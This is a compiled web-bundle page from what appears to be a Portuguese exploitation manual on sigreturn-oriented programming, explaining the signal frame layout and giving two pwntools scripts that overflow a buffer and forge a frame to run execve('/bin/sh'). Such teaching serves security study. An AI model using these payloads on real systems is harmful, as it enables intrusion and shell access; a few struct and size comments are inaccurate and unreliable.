"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[2874],{6924(r,e,n){n.r(e),n.d(e,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>t,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"pwning/rop/8-4-sigrop","title":"SIGROP (Sigreturn-Oriented Programming)","description":"Sigreturn \xe9 quando um programa \xe9 interrompido por um sinal (SIGINT, SIGSEV, etc).","source":"@site/docs/pwning/rop/8-4-sigrop.mdx","sourceDirName":"pwning/rop","slug":"/pwning/rop/8-4-sigrop","permalink":"/manual-pwning/docs/pwning/rop/8-4-sigrop","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"title":"SIGROP (Sigreturn-Oriented Programming)"},"sidebar":"tutorialSidebar","previous":{"title":"Stack Pivoting","permalink":"/manual-pwning/docs/pwning/rop/8-3-stack-pivoting"},"next":{"title":"ret2libc","permalink":"/manual-pwning/docs/pwning/rop/8-5-ret2libc"}}');var a=n(4848),o=n(8453);const t={title:"SIGROP (Sigreturn-Oriented Programming)"},i=void 0,d={},c=[{value:"Fazendo o SIGROP",id:"fazendo-o-sigrop",level:2},{value:"Entendendo a struct",id:"entendendo-a-struct",level:3},{value:"Como fazer a struct na stack",id:"como-fazer-a-struct-na-stack",level:3},{value:"Cuidados com a struct",id:"cuidados-com-a-struct",level:3},{value:"Vers\xe3o sem SigreturnFrame() do pwntools",id:"vers\xe3o-sem-sigreturnframe-do-pwntools",level:3},{value:"Vers\xe3o com SigreturnFrame() do pwntools",id:"vers\xe3o-com-sigreturnframe-do-pwntools",level:3}];function l(r){const e={code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,o.R)(),...r.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.p,{children:"Sigreturn \xe9 quando um programa \xe9 interrompido por um sinal (SIGINT, SIGSEV, etc)."}),"\n",(0,a.jsxs)(e.p,{children:["Quando o programa \xe9 interrompido, o kernel salva TODO o estado do programa (registradores). Ao retornar (",(0,a.jsx)(e.code,{children:"sigreturn()"}),"), restaura TUDO o que estava salvo."]}),"\n",(0,a.jsx)(e.p,{children:"Normalmente estamos acostumados como o SIGSEV, que \xe9 um erro grave do programa e ele encerra imediatamente. Mas outros erros, como SIGINT, SIGALRM, etc, apenas param a execu\xe7\xe3o salvam o estado, fazem algo e depois voltam exatamente do estado salvo."}),"\n",(0,a.jsxs)(e.table,{children:[(0,a.jsx)(e.thead,{children:(0,a.jsxs)(e.tr,{children:[(0,a.jsx)(e.th,{children:"Sinal"}),(0,a.jsx)(e.th,{children:"Significado"}),(0,a.jsx)(e.th,{children:"Como acontece"}),(0,a.jsx)(e.th,{children:"Padr\xe3o"})]})}),(0,a.jsxs)(e.tbody,{children:[(0,a.jsxs)(e.tr,{children:[(0,a.jsx)(e.td,{children:"SIGINT"}),(0,a.jsx)(e.td,{children:"INTERRUPT"}),(0,a.jsx)(e.td,{children:"Voc\xea aperta Ctrl+C no terminal"}),(0,a.jsx)(e.td,{children:"Programa para (pode capturar)"})]}),(0,a.jsxs)(e.tr,{children:[(0,a.jsx)(e.td,{children:"SIGSEGV"}),(0,a.jsx)(e.td,{children:"SEGMENTATION VIOLATION"}),(0,a.jsx)(e.td,{children:"Acesso \xe0 mem\xf3ria inv\xe1lida"}),(0,a.jsx)(e.td,{children:"Programa MORRE"})]}),(0,a.jsxs)(e.tr,{children:[(0,a.jsx)(e.td,{children:"SIGALRM"}),(0,a.jsx)(e.td,{children:"ALARM"}),(0,a.jsx)(e.td,{children:"Timer expira\tPrograma para"}),(0,a.jsx)(e.td,{children:"(pode capturar)"})]}),(0,a.jsxs)(e.tr,{children:[(0,a.jsx)(e.td,{children:"SIGUSR1"}),(0,a.jsx)(e.td,{children:"USER 1"}),(0,a.jsx)(e.td,{children:"Enviado por outro processo"}),(0,a.jsx)(e.td,{children:"Programa para (pode capturar)"})]})]})]}),"\n",(0,a.jsx)(e.p,{children:"Um exemplo de cen\xe1rio de SIGINT:"}),"\n",(0,a.jsxs)(e.ol,{children:["\n",(0,a.jsx)(e.li,{children:"Programa rodando normalmente"}),"\n",(0,a.jsx)(e.li,{children:"Usu\xe1rio aperta Ctrl+C \u2192 SIGINT"}),"\n",(0,a.jsxs)(e.li,{children:["Kernel automaticamente:","\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:"Pausa programa"}),"\n",(0,a.jsx)(e.li,{children:"PUSH: Salva RAX, RBX, RCX, RIP, RSP... na pilha"}),"\n",(0,a.jsx)(e.li,{children:"Chama fun\xe7\xe3o de tratamento"}),"\n"]}),"\n"]}),"\n",(0,a.jsx)(e.li,{children:"Tratamento faz algo (ex: salvar arquivo)"}),"\n",(0,a.jsxs)(e.li,{children:["sigreturn() autom\xe1tico:","\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsxs)(e.li,{children:["POP: ",(0,a.jsx)(e.strong,{children:"Restaura RAX, RBX, RCX, RIP, RSP..."})]}),"\n",(0,a.jsx)(e.li,{children:"Continua execu\xe7\xe3o normal"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(e.p,{children:["Podemos forjar uma estrutura na pilha que simula um estado salvo, e chamar ",(0,a.jsx)(e.code,{children:"sigreturn()"})," para carregar nossos valores em TODOS os registradores de uma vez! Isso pois o kernel n\xe3o verifica se o estado sendo restaurado \xe9 leg\xedtimo."]}),"\n",(0,a.jsx)(e.p,{children:"Isso evita ter que usar muitos gadgets, como fazemos no ROP comum. No SIGROP, controlamos tudo com uma s\xf3 chamada."}),"\n",(0,a.jsx)(e.h2,{id:"fazendo-o-sigrop",children:"Fazendo o SIGROP"}),"\n",(0,a.jsx)(e.h3,{id:"entendendo-a-struct",children:"Entendendo a struct"}),"\n",(0,a.jsx)(e.p,{children:"Quando o kernel salva estado para um sinal, ele cria uma struct na pilha que cont\xe9m todo o estado do programa atual. Essa struct est\xe1 simulada em C abaixo:"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:"// Estado da FPU - Pode ser omitido, pois \xe9 apenas um ponteiro na struct.\r\nstruct _fpstate {\r\n    uint64_t cwd;\r\n    uint64_t swd;\r\n    // ... muitos campos\r\n};\r\n\r\n// Estrutura dos registradores (SIGCONTEXT)\r\nstruct sigcontext {\r\n    // Registradores de prop\xf3sito geral\r\n    uint64_t r8, r9, r10, r11, r12, r13, r14, r15, rdi, rsi, rbp;\r\n    uint64_t rbx;      // Base Pointer\r\n    uint64_t rdx;rax;rcx;\r\n    uint64_t rsp;      // Stack Pointer\r\n    uint64_t rip;      // Instruction Pointer (CR\xcdTICO!)\r\n    uint64_t eflags;   // Flags da CPU\r\n    \r\n    // Registradores de segmento (x86_64)\r\n    uint16_t cs;       // Code Segment (deve ser 0x33)\r\n    uint16_t gs;\r\n    uint16_t fs;\r\n    uint16_t __pad0;\r\n    \r\n    // Informa\xe7\xf5es de erro\r\n    uint64_t err, trapno, oldmask;\r\n    uint64_t cr2;      // Page Fault Address\r\n    \r\n    // Ponteiro para estado FPU\r\n    struct _fpstate *fpstate;\r\n    \r\n    // Reservado\r\n    uint64_t __reserved1[8];\r\n};\r\n\r\n// Stack do usu\xe1rio\r\ntypedef struct {\r\n    void *ss_sp;\r\n    int ss_flags;\r\n    size_t ss_size;\r\n} stack_t;\r\n\r\n// Contexto do usu\xe1rio\r\nstruct ucontext {\r\n    unsigned long uc_flags;\r\n    struct ucontext *uc_link;\r\n    stack_t uc_stack;\r\n    struct sigcontext uc_mcontext;  // REGISTRADORES AQUI! (O QUE MANIPULAMOS)\r\n    sigset_t uc_sigmask;            // M\xe1scara de sinais\r\n    char __pad[120];                // Padding para alinhamento\r\n};\r\n\r\n// Estrutura COMPLETA na pilha\r\nstruct rt_sigframe {\r\n    void *pretcode;            // Para retornar do signal handler\r\n    struct ucontext uc;        // Contexto completo\r\n    siginfo_t info;            // Informa\xe7\xe3o do sinal (128 bytes)\r\n    // fpstate pode vir aqui se necess\xe1rio\r\n};\n"})}),"\n",(0,a.jsx)(e.p,{children:"Na stack, ter\xedamos algo como:"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:'OFFSET  TAMANHO  CAMPO                   IMPORT\xc2NCIA\r\n------  -------  ----------------------  ------------------------------------\r\n0x000   8        pretcode                \u26a0\ufe0f In\xedcio do rt_sigframe\r\n0x008   8        uc.uc_flags             \ud83d\udfe1 Pode ser 0\r\n0x010   8        uc.uc_link              \ud83d\udfe1 Pode ser 0\r\n0x018   8        uc.uc_stack.ss_sp       \ud83d\udfe1 Pode ser 0\r\n0x020   8        uc.uc_stack.ss_flags    \ud83d\udfe1 Pode ser 0\r\n0x028   8        uc.uc_stack.ss_size     \ud83d\udfe1 Pode ser 0\r\n                                                                             \r\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 SIGCONTEXT COME\xc7A AQUI! \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n                                                                             \r\n0x030   8        r8                      \ud83d\udfe1 Pode ser 0\r\n0x038   8        r9                      \ud83d\udfe1 Pode ser 0\r\n0x040   8        r10                     \ud83d\udfe1 Pode ser 0\r\n0x048   8        r11                     \ud83d\udfe1 Pode ser 0\r\n0x050   8        r12                     \ud83d\udfe1 Pode ser 0\r\n0x058   8        r13                     \ud83d\udfe1 Pode ser 0\r\n0x060   8        r14                     \ud83d\udfe1 Pode ser 0\r\n0x068   8        r15                     \ud83d\udfe1 Pode ser 0\r\n0x070   8        rdi                     \ud83d\udd34 1\xba ARG (ponteiro "/bin/sh")\r\n0x078   8        rsi                     \ud83d\udd34 2\xba ARG (argv = 0/NULL)\r\n0x080   8        rbp                     \ud83d\udfe1 Pode ser 0 (se n\xe3o usar)\r\n0x088   8        rbx                     \ud83d\udfe1 Pode ser 0\r\n0x090   8        rdx                     \ud83d\udd34 3\xba ARG (envp = 0/NULL)\r\n0x098   8        rax                     \ud83d\udd34 SYSCALL NUMBER (59=execve)\r\n0x0A0   8        rcx                     \ud83d\udfe1 Pode ser 0\r\n0x0A8   8        rsp                     \ud83d\udd34 STACK POINTER (deve ser v\xe1lido!)\r\n0x0B0   8        rip                     \ud83d\udd34 INSTRUCTION POINTER (syscall addr)\r\n0x0B8   8        eflags                  \ud83d\udfe1 0x202 (interrupts enabled)\r\n0x0C0   2        cs                      \ud83d\udd34 0x33 (64-bit user code segment)\r\n0x0C2   2        gs                      \ud83d\udfe1 Pode ser 0\r\n0x0C4   2        fs                      \ud83d\udfe1 Pode ser 0\r\n0x0C6   2        __pad0                  \ud83d\udfe1 Pode ser 0\r\n0x0C8   8        err                     \ud83d\udfe1 Pode ser 0\r\n0x0D0   8        trapno                  \ud83d\udfe1 Pode ser 0\r\n0x0D8   8        oldmask                 \ud83d\udfe1 Pode ser 0\r\n0x0E0   8        cr2                     \ud83d\udfe1 Pode ser 0\r\n0x0E8   8        fpstate                 \ud83d\udfe1 Pode ser 0 (NULL)\r\n0x0F0   8        __reserved1[0]          \ud83d\udfe1 Pode ser 0\r\n0x0F8   8        __reserved1[1]          \ud83d\udfe1 Pode ser 0\r\n0x100   8        __reserved1[2]          \ud83d\udfe1 Pode ser 0\r\n0x108   8        __reserved1[3]          \ud83d\udfe1 Pode ser 0\r\n0x110   8        __reserved1[4]          \ud83d\udfe1 Pode ser 0\r\n0x118   8        __reserved1[5]          \ud83d\udfe1 Pode ser 0\r\n0x120   8        __reserved1[6]          \ud83d\udfe1 Pode ser 0\r\n0x128   8        __reserved1[7]          \ud83d\udfe1 Pode ser 0\r\n                                                                             \r\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 FIM DO SIGCONTEXT (0x130) \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n                                                                             \r\n0x130   128      uc.uc_sigmask           \ud83d\udfe1 16 * 8 = 128 bytes (0s)\r\n0x1B0   224      uc.__pad                \ud83d\udfe1 28 * 8 = 224 bytes (padding)\r\n0x290   128      info                    \ud83d\udfe1 siginfo_t (128 bytes de 0)\r\n                                                                             \r\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 FIM DO RT_SIGFRAME (0x310) \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n'})}),"\n",(0,a.jsx)(e.h3,{id:"como-fazer-a-struct-na-stack",children:"Como fazer a struct na stack"}),"\n",(0,a.jsxs)(e.p,{children:["Para fazer o SIGROP vamos chamar usar a syscall ",(0,a.jsx)(e.code,{children:"sigreturn()"}),", que faz a restaura\xe7\xe3o de estado. A ",(0,a.jsx)(e.code,{children:"struct sigcontext"})," precisa vir ",(0,a.jsx)(e.strong,{children:"imediatamente ap\xf3s a syscall"}),". Cuidado: Se voc\xea criar a struct manualmente (sem pwntools), a syscall ",(0,a.jsx)(e.code,{children:"sigreturn()"})," vai pegar o que estiver na stack, podendo pegar lixo e crashar o programa. Abaixo, vemos como a struct sigcontext"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:'ANTES do sigreturn():\r\n[Topo da pilha]\r\n\u251c\u2500\u2500 ... outros dados ...\r\n\u251c\u2500\u2500 POP_RAX_ADDR        \u2190 Retorno atual (pop rax; ret)\r\n\u251c\u2500\u2500 15                  \u2190 Valor para RAX\r\n\u251c\u2500\u2500 SYSCALL_ADDR        \u2190 syscall; ret (chama sigreturn)\r\n\u2514\u2500\u2500 \u2193\u2193\u2193 AQUI COME\xc7A A STRUCT RT_SIGFRAME \u2193\u2193\u2193\r\n    \u251c\u2500\u2500 pretcode        \u2190 8 bytes (lixo/endere\xe7o \xfatil)\r\n    \u251c\u2500\u2500 uc_flags        \u2190 8 bytes (0)\r\n    \u251c\u2500\u2500 uc_link         \u2190 8 bytes (0)\r\n    \u251c\u2500\u2500 uc_stack.ss_sp  \u2190 8 bytes (0)\r\n    \u251c\u2500\u2500 uc_stack.ss_flags \u2190 8 bytes (0)\r\n    \u251c\u2500\u2500 uc_stack.ss_size \u2190 8 bytes (0)\r\n    \u251c\u2500\u2500 \u2193\u2193\u2193 AQUI COME\xc7A STRUCT SIGCONTEXT \u2193\u2193\u2193\r\n    \u2502   \u251c\u2500\u2500 r8   = 0\r\n    \u2502   \u251c\u2500\u2500 r9   = 0\r\n    \u2502   \u251c\u2500\u2500 ...\r\n    \u2502   \u251c\u2500\u2500 rdi  = BINSH_ADDR    \u2190 "/bin/sh" aqui!\r\n    \u2502   \u251c\u2500\u2500 rsi  = 0\r\n    \u2502   \u251c\u2500\u2500 ...\r\n    \u2502   \u251c\u2500\u2500 rax  = 59            \u2190 execve syscall number\r\n    \u2502   \u251c\u2500\u2500 ...\r\n    \u2502   \u251c\u2500\u2500 rip  = SYSCALL_ADDR  \u2190 ONDE continuar ap\xf3s sigreturn\r\n    \u2502   \u2514\u2500\u2500 [resto do sigcontext + padding]\r\n    \u2514\u2500\u2500 \u2193\u2193\u2193 FIM DO FRAME \u2193\u2193\u2193\n'})}),"\n",(0,a.jsx)(e.h3,{id:"cuidados-com-a-struct",children:"Cuidados com a struct"}),"\n",(0,a.jsxs)(e.p,{children:["Na struct, voc\xea s\xf3 precisa inicializar os registradores que precisa e inicializar os outros com 0. Mas cuidado! Isso pode dar problema para alguns registradores. Imagine se ",(0,a.jsx)(e.code,{children:"rsp"})," for setado como 0, e o programa tentar acessar a stack!"]}),"\n",(0,a.jsx)(e.p,{children:"Assim, h\xe1 alguns registradores que devem ter uma aten\xe7\xe3o especial:"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"x86_64"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsxs)(e.li,{children:["CR\xcdTICOS (n\xe3o podem ser 0) -","\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:(0,a.jsx)(e.code,{children:"rip"})}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"rsp/rbp"})," (se for continuar ap\xf3s syscall)"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"cs"})," (Code Segment, deve ser ",(0,a.jsx)(e.code,{children:"0x33"})," para user-space)"]}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(e.li,{children:["IMPORTANTES (depende) - ",(0,a.jsx)(e.code,{children:"rdi"}),", ",(0,a.jsx)(e.code,{children:"rsi"}),", ",(0,a.jsx)(e.code,{children:"rdx"}),", ",(0,a.jsx)(e.code,{children:"rax"})]}),"\n",(0,a.jsx)(e.li,{children:"Os outros podem ser setados com 0."}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"x86"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsxs)(e.li,{children:["CR\xcdTICOS (n\xe3o podem ser 0)","\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:(0,a.jsx)(e.code,{children:"eip"})}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"esp/ebp"})," (se for continuar ap\xf3s syscall)"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"cs"})," (Code Segment, deve ser ",(0,a.jsx)(e.code,{children:"0x73"}),"para user-space)"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"ss"})," (Stack Segment, deve ser ",(0,a.jsx)(e.code,{children:"0x7b"}),")"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"ds"})," (Data Segment, deve ser ",(0,a.jsx)(e.code,{children:"0x7b"}),")"]}),"\n",(0,a.jsxs)(e.li,{children:[(0,a.jsx)(e.code,{children:"es"})," (Extra Segment, deve ser ",(0,a.jsx)(e.code,{children:"0x7b"}),")"]}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(e.li,{children:["IMPORTANTES (depende) - ",(0,a.jsx)(e.code,{children:"ebx"}),", ",(0,a.jsx)(e.code,{children:"ecx"}),", ",(0,a.jsx)(e.code,{children:"edx"}),", ",(0,a.jsx)(e.code,{children:"eax"})]}),"\n",(0,a.jsx)(e.li,{children:"Os outros podem ser setados com 0."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,a.jsxs)(e.p,{children:["O RBP s\xf3 importa ",(0,a.jsx)(e.strong,{children:"se o programa usa RBP explicitamente"}),", como :"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"; Acessando vari\xe1veis locais com base em rbp\r\nmov rax, [rbp-8]  ; \u2190 CRASH se RBP inv\xe1lido!\r\n\r\n; Fun\xe7\xf5es que salvam e restauram rbp\r\nfunc:\r\n    push rbp        ; Salva RBP antigo\r\n    mov rbp, rsp    ; Novo frame pointer\r\n    ...             ; Usa [rbp+X] para vari\xe1veis\r\n    pop rbp         ; Restaura RBP antigo \u2190 CRASH se RBP inv\xe1lido!\r\n    ret\n"})}),"\n",(0,a.jsx)(e.p,{children:"Caso contr\xe1rio, s\xf3 o RSP importa (existem programas que fazem tudo com base no RSP)."}),"\n",(0,a.jsxs)(e.p,{children:["Mas h\xe1 exce\xe7\xf5es para esses registradores cr\xedticos. Se voc\xea usar o SIGROP para chamar ",(0,a.jsx)(e.code,{children:'execve("/bin/sh")'}),", por exemplo, ",(0,a.jsx)(e.strong,{children:"o novo processo substitui o espa\xe7o de mem\xf3ria e o estado anterior \xe9 destru\xeddo"}),". Assim, n\xe3o importa se houverem registradores inv\xe1lidos."]}),"\n",(0,a.jsxs)(e.p,{children:["Para outras syscalls como ",(0,a.jsx)(e.code,{children:"read"}),", ",(0,a.jsx)(e.code,{children:"write"}),", ",(0,a.jsx)(e.code,{children:"open"}),", ",(0,a.jsx)(e.strong,{children:"o crash ser\xe1 somente ap\xf3s o syscall"}),", assim voc\xea ainda pode se aproveitar disso para fazer o que tem que ser feito antes do crash."]}),"\n",(0,a.jsx)(e.h3,{id:"vers\xe3o-sem-sigreturnframe-do-pwntools",children:"Vers\xe3o sem SigreturnFrame() do pwntools"}),"\n",(0,a.jsxs)(e.p,{children:["O payload abaixo \xe9 manual, de modo que montamos a struct que o ",(0,a.jsx)(e.code,{children:"sigreturn()"})," pede na m\xe3o."]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-py",children:'from pwn import *\r\n\r\ncontext.arch = \'amd64\'\r\n\r\n# Offsets\r\nBUFFER_OFFSET = 136\r\nSYSCALL = 0x400100\r\nPOP_RAX = 0x4000f0\r\nBINSH = 0x601000\r\nVALID_STACK = 0x7fffffffe000\r\n\r\npayload = b"A" * BUFFER_OFFSET\r\n\r\n# 1. Chamar sigreturn\r\npayload += p64(POP_RAX)\r\npayload += p64(15)            # sigreturn syscall number\r\npayload += p64(SYSCALL)       # syscall; ret\r\n\r\n# 2. Montar rt_sigframe MANUALMENTE\r\n# Parte 1: Campos antes do sigcontext (48 bytes)\r\nframe = b""\r\nframe += p64(0)              # pretcode\r\nframe += p64(0)              # uc_flags\r\nframe += p64(0)              # uc_link\r\nframe += p64(0)              # uc_stack.ss_sp\r\nframe += p64(0)              # uc_stack.ss_flags\r\nframe += p64(0)              # uc_stack.ss_size\r\n# Total: 6 * 8 = 48 bytes\r\n\r\n# Parte 2: sigcontext (come\xe7a aqui!)\r\n# r8-r15 (8 registradores)\r\nframe += p64(0) * 8\r\n\r\n# rdi, rsi, rbp, rbx, rdx, rax, rcx\r\nframe += p64(BINSH)          # rdi\r\nframe += p64(0)              # rsi\r\nframe += p64(VALID_STACK)    # rbp\r\nframe += p64(0)              # rbx\r\nframe += p64(0)              # rdx\r\nframe += p64(59)             # rax = execve\r\nframe += p64(0)              # rcx\r\n\r\n# rsp, rip (CR\xcdTICOS!)\r\nframe += p64(VALID_STACK)    # rsp\r\nframe += p64(SYSCALL)        # rip\r\n\r\n# eflags\r\nframe += p64(0x202)          # interrupts enabled\r\n\r\n# cs, gs, fs, pad\r\nframe += p16(0x33)           # cs (64-bit user)\r\nframe += p16(0)              # gs\r\nframe += p16(0)              # fs\r\nframe += p16(0)              # pad\r\n\r\n# err, trapno, oldmask, cr2\r\nframe += p64(0) * 4\r\n\r\n# fpstate + reserved[8]\r\nframe += p64(0)              # fpstate\r\nframe += p64(0) * 8          # reserved\r\n\r\n# Parte 3: uc_sigmask + padding (128 + 224 bytes)\r\nframe += p64(0) * 16         # uc_sigmask (128 bytes)\r\nframe += p64(0) * 28         # padding para 16-byte align (224 bytes)\r\n\r\n# Parte 4: siginfo_t (128 bytes) - opcional mas presente\r\nframe += p64(0) * 16         # 128 bytes\r\n\r\npayload += frame\r\n\r\nprint(f"Frame size: {len(frame)} bytes")\r\nprint(f"Total payload: {len(payload)} bytes")\r\n# Resultado: 48 + 320 + 128 + 224 + 128 = ~848 bytes\n'})}),"\n",(0,a.jsx)(e.h3,{id:"vers\xe3o-com-sigreturnframe-do-pwntools",children:"Vers\xe3o com SigreturnFrame() do pwntools"}),"\n",(0,a.jsxs)(e.p,{children:["O pwntools possui uma ferramenta pr\xf3pria, o ",(0,a.jsx)(e.code,{children:"SigreturnFrame"}),". Ele j\xe1 possui toda a struct do sigreturn que precisamos. \xc9 importante ressaltar que todos os registradores que n\xe3o definimos ser\xe3o inicializados com 0 por padr\xe3o."]}),"\n",(0,a.jsx)(e.p,{children:"Indico utilizar essa ferramenta, que agiliza a cria\xe7\xe3o do payload e evita erros desnecess\xe1rios."}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-py",children:'from pwn import *\r\n\r\n# Contexto da arquitetura\r\ncontext.arch = \'amd64\'\r\ncontext.os = \'linux\'\r\n\r\n# Conectar ao alvo\r\n# p = process(\'./vulneravel\')\r\n# OU\r\n# p = remote(\'alvo.com\', 1234)\r\n\r\n# OFFSETS (voc\xea precisa descobrir esses)\r\nBUFFER_OFFSET = 136\r\nSYSCALL_ADDR = 0x400100  # Endere\xe7o de um gadget "syscall; ret"\r\nPOP_RAX_ADDR = 0x4000f0  # Gadget "pop rax; ret"\r\nBINSH_ADDR = 0x601000    # Onde "/bin/sh" est\xe1 na mem\xf3ria\r\n\r\n# Passo 1: Preencher buffer at\xe9 atingir o endere\xe7o de retorno\r\npayload = b"A" * BUFFER_OFFSET\r\n\r\n# Passo 2: Chamar sigreturn (syscall 15)\r\npayload += p64(POP_RAX_ADDR)  # pop rax; ret\r\npayload += p64(15)            # RAX = 15 (n\xfamero da syscall sigreturn)\r\npayload += p64(SYSCALL_ADDR)  # syscall; ret\r\n\r\n# Passo 3: Estrutura forjada do rt_sigframe na pilha\r\n# O pwntools j\xe1 cria a estrutura COMPLETA automaticamente\r\n\r\nsigframe = SigreturnFrame(kernel=\'amd64\')  # Especifica arquitetura\r\nsigframe.rax = 59             # syscall execve\r\nsigframe.rdi = BINSH_ADDR     # endere\xe7o de "/bin/sh"\r\nsigframe.rsi = 0              # argv = NULL\r\nsigframe.rdx = 0              # envp = NULL\r\nsigframe.rip = SYSCALL_ADDR   # syscall ap\xf3s sigreturn\r\nsigframe.rsp = 0x7fffffffe000 # stack v\xe1lida (IMPORTANTE!)\r\nsigframe.cs = 0x33            # code segment 64-bit user\r\n\r\n# Se quiser ver o que est\xe1 sendo criado:\r\nprint(f"Tamanho do frame: {len(bytes(sigframe))} bytes")\r\n# ~440 bytes para x86_64\r\n\r\npayload += bytes(sigframe)\r\n\r\n# Enviar payload\r\n# p.send(payload)\r\n# p.interactive()\r\n\r\nprint("Payload montado! Tamanho:", len(payload))\n'})})]})}function p(r={}){const{wrapper:e}={...(0,o.R)(),...r.components};return e?(0,a.jsx)(e,{...r,children:(0,a.jsx)(l,{...r})}):l(r)}},8453(r,e,n){n.d(e,{R:()=>t,x:()=>i});var s=n(6540);const a={},o=s.createContext(a);function t(r){const e=s.useContext(o);return s.useMemo(function(){return"function"==typeof r?r(e):{...e,...r}},[e,r])}function i(r){let e;return e=r.disableParentContext?"function"==typeof r.components?r.components(a):r.components||a:t(r.components),s.createElement(o.Provider,{value:e},r.children)}}}]);